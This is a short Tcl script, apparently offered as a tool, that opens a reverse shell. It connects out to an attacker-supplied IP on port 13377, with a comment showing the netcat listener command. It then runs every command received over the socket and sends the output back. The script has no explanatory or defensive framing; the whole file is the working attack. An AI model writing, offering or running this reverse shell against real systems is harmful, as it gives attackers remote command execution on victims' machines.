set we {  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\\___/ \__,_|\___|
}

set po 13377 // nc -l -p 13377

set args [lindex $argv 0]
if {[llength $args] < 1} {
    puts "Please provide the IP address as a command-line argument."
    exit 1
}

set ip [lindex $args 0]
set sock [socket $ip $po]
set clientIP [lindex [exec nslookup [lindex [fconfigure $sock -sockname] 0]] 4]

puts -nonewline $sock $we
puts $sock "\nClient IP: $clientIP"

while {1} {
    puts -nonewline $sock "\n\$ "
    flush $sock

    set cmd [gets $sock]
    if {$cmd eq "exit"} {
        close $sock
        exit 0
    }

    set fp [open "| $cmd r"]
    while {[gets $fp line] >= 0} {
        puts -nonewline $sock $line
    }
    close $fp
}
